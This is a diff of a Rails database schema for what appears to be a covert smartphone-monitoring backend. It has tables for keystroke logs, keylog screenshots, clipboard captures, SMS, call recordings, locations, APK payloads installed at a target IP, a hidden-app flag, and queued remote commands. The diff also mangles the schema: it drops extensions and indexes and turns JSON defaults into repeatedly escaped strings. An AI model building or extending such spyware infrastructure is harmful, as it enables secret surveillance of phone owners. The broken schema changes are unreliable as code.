@@ -10,11 +10,7 @@
 #
 # It's strongly recommended that you check this file into your version control system.
 
-ActiveRecord::Schema.define(version: 2026_02_18_100000) do
-
-  # These are extensions that must be enabled in order to support this database
-  enable_extension "pg_trgm"
-  enable_extension "plpgsql"
+ActiveRecord::Schema.define(version: 2026_02_18_100001) do
 
   create_table "active_admin_comments", force: :cascade do |t|
     t.string "namespace"
@@ -31,7 +27,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "admin_sessions", force: :cascade do |t|
-    t.bigint "admin_user_id", null: false
+    t.integer "admin_user_id", null: false
     t.string "session_token", null: false
     t.string "ip_address"
     t.string "user_agent"
@@ -47,10 +43,10 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "admin_two_factors", force: :cascade do |t|
-    t.bigint "admin_user_id", null: false
+    t.integer "admin_user_id", null: false
     t.string "otp_secret", null: false
     t.boolean "enabled", default: false, null: false
-    t.json "backup_codes", default: []
+    t.json "backup_codes", default: "\"[]\""
     t.datetime "last_used_at"
     t.integer "failed_attempts", default: 0, null: false
     t.datetime "locked_until"
@@ -86,15 +82,15 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "alerts", force: :cascade do |t|
-    t.bigint "alert_rule_id"
-    t.bigint "device_id"
+    t.integer "alert_rule_id"
+    t.integer "device_id"
     t.string "severity"
     t.string "title", null: false
     t.text "message"
-    t.json "metadata", default: {}
+    t.json "metadata", default: "\"\\\"\\\\\\\"\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"{}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\"\\\\\\\"\\\"\""
     t.datetime "triggered_at"
     t.datetime "acknowledged_at"
-    t.bigint "acknowledged_by_id"
+    t.integer "acknowledged_by_id"
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["acknowledged_by_id"], name: "index_alerts_on_acknowledged_by_id"
@@ -105,7 +101,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "api_keys", force: :cascade do |t|
-    t.bigint "admin_user_id"
+    t.integer "admin_user_id"
     t.string "device_id"
     t.string "key_digest", null: false
     t.string "key_prefix", null: false
@@ -128,7 +124,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   create_table "apk_installations", force: :cascade do |t|
     t.string "target_ip"
     t.string "status"
-    t.bigint "apk_payload_id", null: false
+    t.integer "apk_payload_id", null: false
     t.datetime "created_at", precision: 6
     t.datetime "updated_at", precision: 6
     t.index ["apk_payload_id"], name: "index_apk_installations_on_apk_payload_id"
@@ -145,12 +141,12 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "audio_transcriptions", force: :cascade do |t|
-    t.bigint "recording_id", null: false
+    t.integer "recording_id", null: false
     t.text "text", null: false
     t.string "language", default: "en"
     t.float "confidence"
-    t.json "speakers", default: []
-    t.json "keywords", default: []
+    t.json "speakers", default: "\"[]\""
+    t.json "keywords", default: "\"[]\""
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["created_at"], name: "index_audio_transcriptions_on_created_at"
@@ -159,12 +155,12 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "audit_logs", force: :cascade do |t|
-    t.bigint "admin_user_id"
+    t.integer "admin_user_id"
     t.string "action", null: false
     t.string "auditable_type"
-    t.bigint "auditable_id"
-    t.json "changes", default: {}
-    t.json "metadata", default: {}
+    t.integer "auditable_id"
+    t.json "changes", default: "\"{}\""
+    t.json "metadata", default: "\"{}\""
     t.string "ip_address"
     t.string "user_agent"
     t.text "request_params"
@@ -181,7 +177,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "bookmarks", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "title"
     t.string "url", null: false
     t.string "browser"
@@ -197,16 +193,16 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   create_table "call_logs", force: :cascade do |t|
     t.date "date"
     t.string "filename"
-    t.bigint "smartphone_id", null: false
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
+    t.integer "smartphone_id", null: false
+    t.datetime "created_at"
+    t.datetime "updated_at"
     t.index ["date"], name: "idx_calls_date"
-    t.index ["smartphone_id", "created_at"], name: "idx_calls_device_time", order: { created_at: :desc }
+    t.index ["smartphone_id", "created_at"], name: "idx_calls_device_time"
     t.index ["smartphone_id"], name: "index_call_logs_on_smartphone_id"
   end
 
   create_table "certificates", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "subject", null: false
     t.string "issuer"
     t.string "serial_number"
@@ -223,7 +219,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "clipboard_entries", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.text "content", null: false
     t.string "source_app"
     t.datetime "captured_at", null: false
@@ -235,17 +231,17 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "contacts", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "filename"
     t.string "date"
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
+    t.datetime "created_at"
+    t.datetime "updated_at"
     t.index ["smartphone_id", "created_at"], name: "idx_contacts_device_time"
     t.index ["smartphone_id"], name: "index_contacts_on_smartphone_id"
   end
 
   create_table "data_usage_disclosures", force: :cascade do |t|
-    t.bigint "device_id", null: false
+    t.integer "device_id", null: false
     t.string "disclosure_type"
     t.text "disclosure_content"
     t.datetime "disclosed_at"
@@ -258,7 +254,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "device_consents", force: :cascade do |t|
-    t.bigint "device_id", null: false
+    t.integer "device_id", null: false
     t.string "consent_type", null: false
     t.boolean "granted", default: false, null: false
     t.datetime "granted_at"
@@ -267,7 +263,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.string "ip_address"
     t.text "consent_text"
     t.string "consent_version"
-    t.json "metadata", default: {}
+    t.json "metadata", default: "\"{}\""
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["consent_type"], name: "index_device_consents_on_consent_type"
@@ -277,8 +273,8 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "device_group_memberships", force: :cascade do |t|
-    t.bigint "device_id", null: false
-    t.bigint "device_group_id", null: false
+    t.integer "device_id", null: false
+    t.integer "device_group_id", null: false
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["device_group_id"], name: "index_device_group_memberships_on_device_group_id"
@@ -320,7 +316,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "device_settings", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "key", null: false
     t.string "value", null: false
     t.datetime "created_at", precision: 6, null: false
@@ -330,7 +326,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "device_tags", force: :cascade do |t|
-    t.bigint "device_id", null: false
+    t.integer "device_id", null: false
     t.string "key", null: false
     t.string "value"
     t.datetime "created_at", precision: 6, null: false
@@ -343,17 +339,17 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.date "date"
     t.string "lat"
     t.string "long"
-    t.bigint "smartphone_id", null: false
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.index ["smartphone_id", "created_at"], name: "idx_locations_device_time", order: { created_at: :desc }
+    t.integer "smartphone_id", null: false
+    t.datetime "created_at"
+    t.datetime "updated_at"
+    t.index ["smartphone_id", "created_at"], name: "idx_locations_device_time"
     t.index ["smartphone_id", "date"], name: "idx_locations_device_date"
     t.index ["smartphone_id"], name: "index_geo_locations_on_smartphone_id"
   end
 
   create_table "geofence_events", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
-    t.bigint "geofence_id", null: false
+    t.integer "smartphone_id", null: false
+    t.integer "geofence_id", null: false
     t.string "event_type", null: false
     t.float "lat", null: false
     t.float "lng", null: false
@@ -368,7 +364,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "geofences", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "name", null: false
     t.float "lat"
     t.float "lng"
@@ -385,16 +381,16 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "installed_apps", force: :cascade do |t|
-    t.bigint "device_id", null: false
+    t.integer "device_id", null: false
     t.string "package_name", null: false
     t.string "app_name"
     t.string "version_name"
-    t.bigint "version_code"
+    t.integer "version_code"
     t.boolean "is_system_app", default: false
     t.datetime "install_time"
     t.datetime "last_update_time"
-    t.json "permissions", default: []
-    t.json "metadata", default: {}
+    t.json "permissions", default: "\"[]\""
+    t.json "metadata", default: "\"{}\""
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["device_id", "package_name"], name: "index_installed_apps_on_device_id_and_package_name", unique: true
@@ -402,9 +398,9 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "keylog_screenshots", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "device_id"
-    t.bigint "client_timestamp"
+    t.integer "client_timestamp"
     t.string "app_package"
     t.string "app_name"
     t.string "trigger_type"
@@ -417,15 +413,15 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.datetime "updated_at", precision: 6, null: false
     t.index ["client_timestamp"], name: "index_keylog_screenshots_on_client_timestamp"
     t.index ["device_id"], name: "index_keylog_screenshots_on_device_id"
-    t.index ["smartphone_id", "client_timestamp"], name: "idx_keylog_screenshots_device_time", order: { client_timestamp: :desc }
+    t.index ["smartphone_id", "client_timestamp"], name: "idx_keylog_screenshots_device_time"
     t.index ["smartphone_id"], name: "index_keylog_screenshots_on_smartphone_id"
     t.index ["trigger_type"], name: "index_keylog_screenshots_on_trigger_type"
   end
 
   create_table "keylogs", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "device_id"
-    t.bigint "client_timestamp"
+    t.integer "client_timestamp"
     t.string "app_package"
     t.string "app_name"
     t.string "activity"
@@ -439,18 +435,18 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.datetime "updated_at", precision: 6, null: false
     t.datetime "captured_at"
     t.index ["app_name"], name: "idx_keylogs_app_name"
-    t.index ["app_name"], name: "index_keylogs_on_app_name_trgm", opclass: :gin_trgm_ops, using: :gin
+    t.index ["app_name"], name: "index_keylogs_on_app_name_trgm"
     t.index ["app_package"], name: "index_keylogs_on_app_package"
     t.index ["client_timestamp"], name: "index_keylogs_on_client_timestamp"
-    t.index ["created_at"], name: "idx_keylogs_recent", order: :desc
+    t.index ["created_at"], name: "idx_keylogs_recent"
     t.index ["device_id"], name: "index_keylogs_on_device_id"
     t.index ["event_type"], name: "index_keylogs_on_event_type"
-    t.index ["full_text"], name: "index_keylogs_on_full_text_trgm", opclass: :gin_trgm_ops, using: :gin
-    t.index ["keystroke"], name: "idx_keylogs_keystroke_trgm", opclass: :gin_trgm_ops, using: :gin
-    t.index ["keystroke"], name: "index_keylogs_on_keystroke_trgm", opclass: :gin_trgm_ops, using: :gin
-    t.index ["smartphone_id", "app_package", "created_at"], name: "idx_keylogs_device_app_time", order: { created_at: :desc }
-    t.index ["smartphone_id", "created_at"], name: "idx_keylogs_active_devices", order: { created_at: :desc }
-    t.index ["smartphone_id", "created_at"], name: "idx_keylogs_device_time", order: { created_at: :desc }
+    t.index ["full_text"], name: "index_keylogs_on_full_text_trgm"
+    t.index ["keystroke"], name: "idx_keylogs_keystroke_trgm"
+    t.index ["keystroke"], name: "index_keylogs_on_keystroke_trgm"
+    t.index ["smartphone_id", "app_package", "created_at"], name: "idx_keylogs_device_app_time"
+    t.index ["smartphone_id", "created_at"], name: "idx_keylogs_active_devices"
+    t.index ["smartphone_id", "created_at"], name: "idx_keylogs_device_time"
     t.index ["smartphone_id"], name: "index_keylogs_on_smartphone_id"
   end
 
@@ -458,10 +454,10 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.date "date"
     t.string "duration"
     t.string "filename"
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "app_name"
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
+    t.datetime "created_at"
+    t.datetime "updated_at"
     t.index ["smartphone_id", "app_name", "created_at"], name: "idx_messaging_dumps_device_app_time"
     t.index ["smartphone_id"], name: "index_messaging_apps_dumps_on_smartphone_id"
   end
@@ -476,11 +472,11 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "notification_logs", force: :cascade do |t|
-    t.bigint "alert_id"
-    t.bigint "notification_channel_id"
+    t.integer "alert_id"
+    t.integer "notification_channel_id"
     t.string "status"
     t.text "error_message"
-    t.json "response_data", default: {}
+    t.json "response_data", default: "\"\\\"\\\\\\\"{}\\\\\\\"\\\"\""
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["alert_id", "status"], name: "index_notification_logs_on_alert_id_and_status"
@@ -489,7 +485,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "notification_media", force: :cascade do |t|
-    t.bigint "device_notification_id", null: false
+    t.integer "device_notification_id", null: false
     t.string "media_type", null: false
     t.binary "data"
     t.string "mime_type"
@@ -500,7 +496,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "pending_commands", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "request_id", null: false
     t.string "command", null: false
     t.json "params"
@@ -511,7 +507,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.datetime "updated_at", precision: 6, null: false
     t.index ["created_at"], name: "index_pending_commands_on_created_at"
     t.index ["request_id"], name: "index_pending_commands_on_request_id", unique: true
-    t.index ["smartphone_id", "created_at"], name: "idx_commands_pending_only", order: { created_at: :desc }, where: "(status = 0)"
+    t.index ["smartphone_id", "created_at"], name: "idx_commands_pending_only", where: "(status = 0)"
     t.index ["smartphone_id", "status", "created_at"], name: "idx_commands_queue"
     t.index ["smartphone_id", "status"], name: "index_pending_commands_on_smartphone_and_status"
     t.index ["smartphone_id"], name: "index_pending_commands_on_smartphone_id"
@@ -522,18 +518,18 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   create_table "pictures", force: :cascade do |t|
     t.date "date"
     t.string "filename"
-    t.bigint "smartphone_id", null: false
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.index ["smartphone_id", "created_at"], name: "idx_pictures_device_time", order: { created_at: :desc }
+    t.integer "smartphone_id", null: false
+    t.datetime "created_at"
+    t.datetime "updated_at"
+    t.index ["smartphone_id", "created_at"], name: "idx_pictures_device_time"
     t.index ["smartphone_id", "date"], name: "idx_pictures_device_date"
     t.index ["smartphone_id"], name: "index_pictures_on_smartphone_id"
   end
 
   create_table "queued_commands", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "command", null: false
-    t.json "params", default: {}
+    t.json "params", default: "\"{}\""
     t.integer "priority", default: 5, null: false
     t.datetime "expires_at", null: false
     t.string "status", default: "pending", null: false
@@ -551,21 +547,21 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.date "date"
     t.string "duration"
     t.string "filename"
-    t.bigint "smartphone_id", null: false
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
+    t.integer "smartphone_id", null: false
+    t.datetime "created_at"
+    t.datetime "updated_at"
     t.string "recording_type", default: "audio"
     t.string "call_number"
     t.string "call_direction"
     t.string "strategy"
     t.index ["recording_type"], name: "index_recordings_on_recording_type"
     t.index ["smartphone_id", "date"], name: "idx_recordings_device_date"
-    t.index ["smartphone_id", "recording_type", "created_at"], name: "idx_recordings_device_type_time", order: { created_at: :desc }
+    t.index ["smartphone_id", "recording_type", "created_at"], name: "idx_recordings_device_type_time"
     t.index ["smartphone_id"], name: "index_recordings_on_smartphone_id"
   end
 
   create_table "remembered_devices", force: :cascade do |t|
-    t.bigint "admin_user_id", null: false
+    t.integer "admin_user_id", null: false
     t.string "device_fingerprint", null: false
     t.string "user_agent"
     t.string "ip_address"
@@ -578,8 +574,8 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "scheduled_command_executions", force: :cascade do |t|
-    t.bigint "scheduled_command_id", null: false
-    t.bigint "pending_command_id"
+    t.integer "scheduled_command_id", null: false
+    t.integer "pending_command_id"
     t.string "status", null: false
     t.json "result"
     t.datetime "executed_at", null: false
@@ -593,9 +589,9 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "scheduled_commands", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "command", null: false
-    t.json "params", default: {}
+    t.json "params", default: "\"{}\""
     t.integer "schedule_type", default: 0, null: false
     t.string "cron_expression"
     t.datetime "next_run_at"
@@ -620,10 +616,10 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.date "date"
     t.string "duration"
     t.string "filename"
-    t.bigint "smartphone_id", null: false
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.index ["smartphone_id", "created_at"], name: "idx_screenshots_device_time", order: { created_at: :desc }
+    t.integer "smartphone_id", null: false
+    t.datetime "created_at"
+    t.datetime "updated_at"
+    t.index ["smartphone_id", "created_at"], name: "idx_screenshots_device_time"
     t.index ["smartphone_id"], name: "index_screenshots_on_smartphone_id"
   end
 
@@ -648,7 +644,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
     t.string "name"
     t.string "is_rooted"
     t.string "is_app_hidden"
-    t.bigint "apk_installation_id", null: false
+    t.integer "apk_installation_id", null: false
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.string "device_id"
@@ -662,13 +658,24 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
 
   create_table "sms_messages", force: :cascade do |t|
     t.date "date"
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "filename"
-    t.datetime "created_at", default: -> { "CURRENT_TIMESTAMP" }
-    t.datetime "updated_at", default: -> { "CURRENT_TIMESTAMP" }
+    t.datetime "created_at"
+    t.datetime "updated_at"
     t.index ["date"], name: "idx_sms_date"
-    t.index ["smartphone_id", "created_at"], name: "idx_sms_device_time", order: { created_at: :desc }
+    t.index ["smartphone_id", "created_at"], name: "idx_sms_device_time"
     t.index ["smartphone_id"], name: "index_sms_messages_on_smartphone_id"
+  end
+
+  create_table "social_media_messages", force: :cascade do |t|
+    t.integer "smartphone_id", null: false
+    t.string "app_name"
+    t.string "sender"
+    t.text "body"
+    t.datetime "sent_at"
+    t.datetime "created_at", precision: 6, null: false
+    t.datetime "updated_at", precision: 6, null: false
+    t.index ["smartphone_id"], name: "index_social_media_messages_on_smartphone_id"
   end
 
   create_table "stored_files", force: :cascade do |t|
@@ -691,14 +698,14 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "terms_acceptances", force: :cascade do |t|
-    t.bigint "device_id", null: false
+    t.integer "device_id", null: false
     t.string "terms_version", null: false
     t.text "terms_text"
     t.boolean "accepted", default: false
     t.datetime "accepted_at"
     t.string "ip_address"
     t.string "user_agent"
-    t.json "acceptance_metadata", default: {}
+    t.json "acceptance_metadata", default: "\"{}\""
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["accepted"], name: "index_terms_acceptances_on_accepted"
@@ -741,15 +748,15 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   end
 
   create_table "user_preferences", force: :cascade do |t|
-    t.bigint "admin_user_id", null: false
-    t.json "preferences", default: {}, null: false
+    t.integer "admin_user_id", null: false
+    t.json "preferences", default: "\"{}\"", null: false
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
     t.index ["admin_user_id"], name: "index_user_preferences_on_admin_user_id", unique: true
   end
 
   create_table "wifi_networks", force: :cascade do |t|
-    t.bigint "smartphone_id", null: false
+    t.integer "smartphone_id", null: false
     t.string "ssid", null: false
     t.string "bssid"
     t.string "security_type"
@@ -807,6 +814,7 @@ ActiveRecord::Schema.define(version: 2026_02_18_100000) do
   add_foreign_key "screenshots", "smartphones", on_delete: :cascade
   add_foreign_key "smartphones", "apk_installations"
   add_foreign_key "sms_messages", "smartphones", on_delete: :cascade
+  add_foreign_key "social_media_messages", "smartphones"
   add_foreign_key "terms_acceptances", "apk_installations", column: "device_id"
   add_foreign_key "user_preferences", "admin_users"
   add_foreign_key "wifi_networks", "smartphones"
